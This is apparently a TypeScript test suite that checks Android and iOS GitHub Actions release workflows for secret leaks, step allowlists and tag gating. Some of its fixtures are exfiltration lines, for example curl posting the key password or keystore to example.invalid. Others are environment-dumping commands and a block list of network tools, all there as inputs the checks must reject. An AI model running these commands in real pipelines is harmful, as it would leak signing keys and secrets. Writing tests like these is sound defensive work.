      expect(injection(addRun(android.wf, 'build', 'true', { shell: 'bash -x {0}' }))).toHaveLength(1);
      expect(injection(android.wf)).toEqual([]);
      expect(injection(ios.wf)).toEqual([]);
    });
  });

  describe('secret use', () => {
    it.each([
      ['${{ secrets }}', 'echo ${{ secrets }}'],
      ['toJSON(secrets)', 'echo ${{ toJSON(secrets) }}'],
      ['bracket syntax', "echo ${{ secrets['ANDROID_KEY_PASSWORD'] }}"],
      ['a named secret', 'echo ${{ secrets.ANDROID_KEY_PASSWORD }}'],
    ])('rejects %s in a run', (_label, run) => {
      expect(secretUse(addRun(android.wf, 'sign', run), ANDROID_SECRETS).length).toBeGreaterThan(0);
      expect(secretUse(addRun(ios.wf, 'testflight', run), IOS_SECRETS).length).toBeGreaterThan(0);
    });

    it('rejects secrets: inherit, a bare secrets expression in env, an unknown secret name, and a secret in an if', () => {
      expect(secretUse(mutate(android.wf, (c) => void (job(c, 'sign').secrets = 'inherit')), ANDROID_SECRETS)).toContain('sign: secrets key (inherit)');
      const bare = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Added', uses: 'x/y@v1', env: { ALL: '${{ toJSON(secrets) }}' } });
      });
      expect(secretUse(bare, ANDROID_SECRETS).length).toBeGreaterThan(0);
      const unknown = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Added', uses: 'x/y@v1', with: { token: '${{ secrets.OTHER }}' } });
      });
      expect(secretUse(unknown, ANDROID_SECRETS)).toContain('sign: unknown secret OTHER');
      expect(secretUse(mutate(android.wf, (c) => void (job(c, 'sign').if = "secrets.X != ''")), ANDROID_SECRETS)).toContain('sign: job if');
    });

    it('rejects a secret in the verify job, in the unsigned build job, or in a job with no environment (control: the real ones are clean)', () => {
      const leak: Step = { name: 'Added', uses: 'x/y@v1', with: { token: '${{ secrets.ANDROID_KEY_PASSWORD }}' } };
      expect(androidGating(mutate(android.wf, (c) => void job(c, 'verify').steps.push(leak)))).toContain('verify holds no secret');
      expect(androidGating(mutate(android.wf, (c) => void job(c, 'build').steps.push(leak)))).toContain('build holds no secret');
      expect(secretUse(mutate(android.wf, (c) => void delete job(c, 'sign').environment), ANDROID_SECRETS)).toContain('sign: holds a secret but names no environment');
      expect(iosGating(mutate(ios.wf, (c) => void job(c, 'verify').steps.push({ ...leak, with: { token: '${{ secrets.APPSTORE_API_PRIVATE_KEY }}' } })))).toContain('verify holds a secret');
      expect(secretUse(android.wf, ANDROID_SECRETS)).toEqual([]);
    });
  });

  describe('steps that hold a secret', () => {
    it('Android: an extra line in the signing step, or a new step holding a secret, is rejected (control: the real ones pass)', () => {
      expect(secretSteps(android.wf, ANDROID_SECRET_STEP_LINES)).toEqual([]);
      const extra = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Align-check and sign the APK (v2 and v3 signatures)');
        s.run = `${s.run ?? ''}curl -d "$ANDROID_KEY_PASSWORD" https://example.invalid\n`;
      });
      expect(secretSteps(extra, ANDROID_SECRET_STEP_LINES)).toHaveLength(1);
      const fresh = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Leak', env: { X: '${{ secrets.ANDROID_KEY_PASSWORD }}' }, run: 'curl -d "$X" https://example.invalid' });
      });
      expect(secretSteps(fresh, ANDROID_SECRET_STEP_LINES)).toContain('sign/Leak: a secret in env of an unlisted step');
    });

    it('iOS: a new step with a secret in env and a run that uses curl is rejected, with the same per-step rule as Android', () => {
      expect(secretSteps(ios.wf, IOS_SECRET_STEP_LINES)).toEqual([]);
      const fresh = mutate(ios.wf, (c) => {
        job(c, 'testflight').steps.push({ name: 'Leak', env: { X: '${{ secrets.APPSTORE_API_PRIVATE_KEY }}' }, run: 'curl -d "$X" https://example.invalid' });
      });
      expect(secretSteps(fresh, IOS_SECRET_STEP_LINES)).toContain('testflight/Leak: a secret in env of an unlisted step');
    });
  });

  describe('forbidden text', () => {
    it.each([
      ['bash -x', 'shell: bash -x {0}', 'bash -x'],
      ['set -x', 'set -x', 'set -x'],
      ['set -eux', 'set -eux', 'set -x'],
      ['export -p', 'export -p', 'export -p'],
      ['declare -p', 'declare -p', 'declare -p'],
      ['/proc/self/environ', 'cat /proc/self/environ', '/proc/self/environ'],
      ['::add-mask', 'echo "::add-mask::x"', '::add-mask'],
      ['ACTIONS_RUNNER_DEBUG', 'ACTIONS_RUNNER_DEBUG: true', 'ACTIONS_RUNNER_DEBUG'],
      ['ACTIONS_STEP_DEBUG', 'ACTIONS_STEP_DEBUG: true', 'ACTIONS_STEP_DEBUG'],
      ['printenv', 'printenv', 'printenv'],
      ['env pipe', 'env | sort', 'env pipe'],
      ['bare env', 'env', 'bare env'],
      ['key block', '-----BEGIN PRIVATE KEY-----', 'key block'],
    ])('rejects %s appended to either workflow', (_label, snippet, name) => {
      expect(forbiddenText(`${android.text}\n        ${snippet}\n`)).toContain(name);
      expect(forbiddenText(`${ios.text}\n        ${snippet}\n`)).toContain(name);
    });

    it('accepts the workflows as they are', () => {
      expect(forbiddenText(android.text)).toEqual([]);
      expect(forbiddenText(ios.text)).toEqual([]);
    });
  });

  describe('the Gradle wrapper does not depend on its committed mode', () => {
    it('rejects a call without chmod, and accepts chmod or sh', () => {
      expect(gradlew(android.wf)).toEqual([]);
      const bare = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = './gradlew --no-daemon assembleRelease\n'));
      expect(gradlew(bare)).toHaveLength(1);
      const late = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = './gradlew assembleRelease\nchmod +x ./gradlew\n'));
      expect(gradlew(late)).toHaveLength(1);
      const viaSh = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = 'sh ./gradlew --no-daemon assembleRelease\n'));
      expect(gradlew(viaSh)).toEqual([]);
    });
  });

  describe('checkout and cache', () => {
    it('rejects a checkout that keeps the token, and a cache in a signing job', () => {
      for (const [wf, id] of [
        [android.wf, 'sign'],
        [ios.wf, 'testflight'],
      ] as const) {
        const keep = mutate(wf, (c) => {
          const checkout = job(c, id).steps.find((s) => s.uses?.startsWith('actions/checkout@'));
          if (checkout?.with !== undefined) delete checkout.with['persist-credentials'];
        });
        expect(hygiene(keep, [id])).toContain(`${id}: checkout keeps credentials`);
      }
      const cached = mutate(android.wf, (c) => {
        const node = job(c, 'sign').steps.find((s) => s.uses?.startsWith('actions/setup-node@'));
        if (node?.with !== undefined) node.with.cache = 'npm';
      });
      expect(hygiene(cached, ['sign'])).toContain('sign: cache in a signing job');
      expect(hygiene(android.wf, ['sign'])).toEqual([]);
      expect(hygiene(ios.wf, ['testflight'])).toEqual([]);
    });
  });

  describe('a branch run never reaches a signing key', () => {
    it('Android: the sign job and the Release job lose their tag conditions, or the build job gains an environment', () => {
      expect(androidGating(mutate(android.wf, (c) => void delete job(c, 'sign').if))).toContain('sign if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').if = "github.event_name == 'workflow_dispatch'")))).toContain('sign if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'release').if = "github.ref_type == 'tag'")))).toContain('release if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'build').environment = 'android-release')))).toContain('build names no environment');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').needs = 'verify')))).toContain('sign needs build');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').permissions = { contents: 'write' })))).toContain('only release writes');
    });

    it('iOS: the TestFlight job loses its tag condition', () => {
      expect(iosGating(mutate(ios.wf, (c) => void delete job(c, 'testflight').if))).toContain('testflight if');
      expect(iosGating(mutate(ios.wf, (c) => void (job(c, 'testflight').if = "github.event_name == 'push'")))).toContain('testflight if');
      expect(iosGating(mutate(ios.wf, (c) => void delete job(c, 'testflight').environment))).toContain('testflight environment');
    });
  });

  describe('what the signing job uploads and in which order', () => {
    it.each(['.', '${{ runner.temp }}', '${{ runner.temp }}/', 'release/../', ''])('rejects an upload path of %j', (path) => {
      const changed = mutate(android.wf, (c) => {
        const upload = job(c, 'sign').steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
        if (upload?.with !== undefined) upload.with.path = path;
      });
      expect(uploadPaths(changed)).toEqual([`upload path ${path}`]);
    });

    it('rejects a second upload', () => {
      const twice = mutate(android.wf, (c) => {
        const j = job(c, 'sign');
        j.steps.splice(j.steps.length - 1, 0, { uses: 'actions/upload-artifact@x', with: { path: 'release/' } });
      });
      expect(uploadPaths(twice)).toContain('expected one upload');
    });

    it('rejects sign before decode, a cleanup that is not last, a cleanup without always(), and a missing step', () => {
      const swap = (names: [string, string]) =>
        mutate(android.wf, (c) => {
          const j = job(c, 'sign');
          const a = j.steps.findIndex((s) => s.name === names[0]);
          const b = j.steps.findIndex((s) => s.name === names[1]);
          const first = j.steps[a] as Step;
          j.steps[a] = j.steps[b] as Step;
          j.steps[b] = first;
        });
      expect(signOrder(swap(['Decode the signing keystore', 'Align-check and sign the APK (v2 and v3 signatures)']))).toContain('step order');
      expect(signOrder(swap(['Select the pinned build tools', 'Decode the signing keystore']))).toContain('step order');
      expect(signOrder(swap(['Delete the keystore', 'Checksums']))).toContain('cleanup is not the last step with always()');
      expect(signOrder(mutate(android.wf, (c) => void delete (job(c, 'sign').steps[job(c, 'sign').steps.length - 1] as Step).if))).toContain('cleanup is not the last step with always()');
      expect(signOrder(mutate(android.wf, (c) => void (job(c, 'sign').steps = job(c, 'sign').steps.filter((s) => s.name !== 'Decode the signing keystore'))))).toContain('step order');
    });
  });

  describe('the iOS build number', () => {
    it('is not the run number alone', () => {
      const sync = step(job(ios.wf, 'testflight'), 'Set the iOS version from package.json and the build number from the run');
      expect(sync.run).not.toContain('"$RUN_NUMBER"');
      expect(sync.run).toContain('RUN_ATTEMPT');
    });
  });
});


// ---- allowlists of steps and actions, and what a signing job may do ----

describe('the signing jobs run exactly the steps that are listed', () => {
  const targets = [
    ['android sign', android.wf, 'sign', EXPECTED_STEPS.androidSign],
    ['android release', android.wf, 'release', EXPECTED_STEPS.androidRelease],
    ['ios testflight', ios.wf, 'testflight', EXPECTED_STEPS.iosTestflight],
  ] as const;

  it.each(targets)('%s: the real job has exactly the listed steps, in order, and nothing forbidden (control for the fixtures below)', (_n, wf, id, expected) => {
    expect(stepAllowlist(job(wf, id), expected)).toEqual([]);
    expect(signingJob(job(wf, id))).toEqual([]);
  });

  it('every job uses only the actions allowed for it, in both workflows', () => {
    expect(usesAllowlist(android.wf, ALLOWED_USES.android ?? {})).toEqual([]);
    expect(usesAllowlist(ios.wf, ALLOWED_USES.ios ?? {})).toEqual([]);
    expect(usesAllowlist(windows.wf, ALLOWED_USES.windows ?? {})).toEqual([]);
    expect(Object.keys(ALLOWED_USES.android ?? {}).sort()).toEqual(Object.keys(android.wf.jobs).sort());
    expect(Object.keys(ALLOWED_USES.ios ?? {}).sort()).toEqual(Object.keys(ios.wf.jobs).sort());
    expect(Object.keys(ALLOWED_USES.windows ?? {}).sort()).toEqual(Object.keys(windows.wf.jobs).sort());
  });

  it('only exact files reach the artifact and the Release: release/ holds one signed APK and SHA256SUMS', () => {
    expect(releaseDir(android.wf)).toEqual([]);
  });

  it('the unsigned APK checksum is recorded by the build job, and again by the signing job for what it signed', () => {
    const build = job(android.wf, 'build');
    const record = step(build, 'Record the unsigned APK checksum');
    expect(record.run).toContain('sha256sum android/app/build/outputs/apk/release/app-release-unsigned.apk');
    expect(record.run).toContain('GITHUB_STEP_SUMMARY');
    const at = (name: string) => build.steps.findIndex((s) => s.name === name);
    expect(at('Record the unsigned APK checksum')).toBeGreaterThan(at('Build the unsigned release APK'));
    expect(at('Record the unsigned APK checksum')).toBeLessThan(build.steps.findIndex((s) => s.uses?.startsWith('actions/upload-artifact@') === true));
    expect(step(job(android.wf, 'sign'), 'Verify the signature and the version').run).toContain('sha256sum unsigned/app-release-unsigned.apk');
  });

  describe('fixtures', () => {
    const cases: [string, Workflow, string][] = [
      ['android sign', android.wf, 'sign'],
      ['android release', android.wf, 'release'],
      ['ios testflight', ios.wf, 'testflight'],
    ];
    const withStep = (wf: Workflow, id: string, added: Step, at?: number) =>
      mutate(wf, (c) => {
        const steps = job(c, id).steps;
        steps.splice(at ?? steps.length - 1, 0, added);
      });

    /** Appends a line to the first script of the job; a job with no script (the Release job) gets a step holding it. */
    const appendRun = (wf: Workflow, id: string, line: string): Workflow =>
      mutate(wf, (c) => {
        const steps = job(c, id).steps;
        const s = steps.find((x) => x.run !== undefined);
        if (s === undefined) steps.push({ name: 'Added', run: line });
        else s.run = `${s.run ?? ''}\n${line}\n`;
      });

    it.each(cases)('%s: an added step is rejected by the step list, even one with no secret in its env', (_n, wf, id) => {
      const added = withStep(wf, id, { name: 'Publish', run: 'echo hello' });
      const expected = id === 'sign' ? EXPECTED_STEPS.androidSign : id === 'release' ? EXPECTED_STEPS.androidRelease : EXPECTED_STEPS.iosTestflight;
      expect(stepAllowlist(job(added, id), expected)).toHaveLength(1);
    });

    it('rejects a step that copies the keystore into the artifact directory or sends it away', () => {
      const cp = withStep(android.wf, 'sign', { name: 'Publish', run: 'cp "$RUNNER_TEMP/release-keystore.p12" release/' });
      expect(stepAllowlist(job(cp, 'sign'), EXPECTED_STEPS.androidSign)).toHaveLength(1);
      expect(signingJob(job(cp, 'sign')).length).toBeGreaterThanOrEqual(2);
      const curl = withStep(android.wf, 'sign', { name: 'Send', run: 'curl --data-binary @"$RUNNER_TEMP/release-keystore.p12" https://example.invalid' });
      expect(signingJob(job(curl, 'sign')).length).toBeGreaterThanOrEqual(2);
    });

    it.each(['curl', 'wget', 'nc', 'ncat', 'scp', 'ssh', 'cp', 'mv', 'ln', 'rsync', 'tar', 'openssl'])('rejects %s even inside an allowed step, in every signing job', (tool) => {
      for (const [, wf, id] of cases) {
        const changed = appendRun(wf, id, `${tool} a b`);
        expect(signingJob(job(changed, id)).length, id).toBeGreaterThan(0);
      }
    });

    it('rejects the keystore path in any step but the decode, sign and cleanup steps', () => {
      const changed = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Verify the signature and the version');
        s.run = `${s.run ?? ''}ls "$RUNNER_TEMP/release-keystore.p12"\n`;
      });
      expect(signingJob(job(changed, 'sign'))).toContain('Verify the signature and the version: keystore path outside its steps');
    });

    it('rejects base64 outside the decode step', () => {
      const changed = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Checksums');
        s.run = `${s.run ?? ''}\nbase64 -w0 x\n`;
      });
      expect(signingJob(job(changed, 'sign'))).toContain('Checksums: base64 outside the decode');
    });

    it.each(['GITHUB_ENV', 'GITHUB_OUTPUT', 'GITHUB_PATH'])('rejects a write to %s anywhere but the one build-tools PATH line', (file) => {
      for (const [, wf, id] of cases) {
        const changed = appendRun(wf, id, `echo x >> "$${file}"`);
        expect(signingJob(job(changed, id)).some((v) => v.endsWith('write to an environment file'))).toBe(true);
      }
      const other = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), PATH_STEP);
        s.run = `${s.run ?? ''}echo x >> "$${file}"\n`;
      });
      expect(signingJob(job(other, 'sign')).some((v) => v.endsWith('write to an environment file'))).toBe(true);
    });

    it('accepts the one PATH line in the build-tools step (control), and rejects the same line in another step', () => {
      expect(step(job(android.wf, 'sign'), PATH_STEP).run).toContain(PATH_LINE);
      expect(signingJob(job(android.wf, 'sign'))).toEqual([]);
      const moved = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Checksums');
        s.run = `${s.run ?? ''}\n${PATH_LINE}\n`;
      });
      expect(signingJob(job(moved, 'sign'))).toContain('Checksums: write to an environment file');
    });

    it.each(['continue-on-error', 'strategy', 'defaults', 'container', 'services'])('rejects the job key %s in a signing job', (key) => {
      for (const [, wf, id] of cases) {
        const changed = mutate(wf, (c) => {
          (job(c, id) as unknown as Record<string, unknown>)[key] = key === 'continue-on-error' ? true : {};
        });
        expect(signingJob(job(changed, id))).toContain(`job key ${key}`);
      }
    });

    it('rejects continue-on-error on a step of a signing job', () => {
      const changed = mutate(android.wf, (c) => void ((step(job(c, 'sign'), 'Checksums') as unknown as Record<string, unknown>)['continue-on-error'] = true));
      expect(signingJob(job(changed, 'sign'))).toContain('Checksums: continue-on-error');
    });

    it('rejects a new action, even one pinned to a commit, until the allowlist is edited', () => {
      const pinned = 'x/y@0123456789abcdef0123456789abcdef01234567';
      for (const [, wf, id] of cases) {
        const changed = withStep(wf, id, { uses: pinned });
        const key = wf === android.wf ? 'android' : 'ios';
        expect(usesAllowlist(changed, ALLOWED_USES[key] ?? {})).toContain(`${id}: action x/y is not allowed`);
      }
      const inVerify = withStep(android.wf, 'verify', { uses: pinned }, 0);
      expect(usesAllowlist(inVerify, ALLOWED_USES.android ?? {})).toContain('verify: action x/y is not allowed');
      const swapped = mutate(android.wf, (c) => void (job(c, 'release').steps[0] = { uses: 'actions/upload-artifact@0123456789abcdef0123456789abcdef01234567' }));
      expect(usesAllowlist(swapped, ALLOWED_USES.android ?? {})).toContain('release: action actions/upload-artifact is not allowed');
    });

    it('rejects an artifact directory with an extra writer, and a Release with other files', () => {
      const extra = mutate(android.wf, (c) => {
        const verify = step(job(c, 'sign'), 'Verify the signature and the version');
        verify.run = `${verify.run ?? ''}echo x > release/extra.txt\n`;
      });
      expect(releaseDir(extra)[0]).toContain('release/ lines');
      const files = mutate(android.wf, (c) => {
        const create = step(job(c, 'release'), 'Create the draft Release');
        if (create.with !== undefined) create.with.files = 'release/*\n';
      });
      expect(releaseDir(files)).toContain('release files');
    });
  });
});
